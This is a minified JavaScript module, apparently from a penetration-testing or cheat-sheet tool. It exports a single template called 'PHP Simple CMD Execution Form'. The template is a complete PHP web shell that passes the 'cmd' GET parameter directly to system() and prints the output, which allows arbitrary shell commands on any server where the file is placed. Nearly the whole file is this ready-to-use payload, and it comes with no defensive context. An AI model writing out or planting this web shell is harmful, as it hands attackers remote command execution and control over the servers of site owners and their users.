const e=[{title:"PHP Simple CMD Execution Form",template:`<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();<\/script>
</html>`,description:"Simple PHP web form to execute shell commands via GET parameter 'cmd'."}],n={commands:e};export{e as commands,n as default};
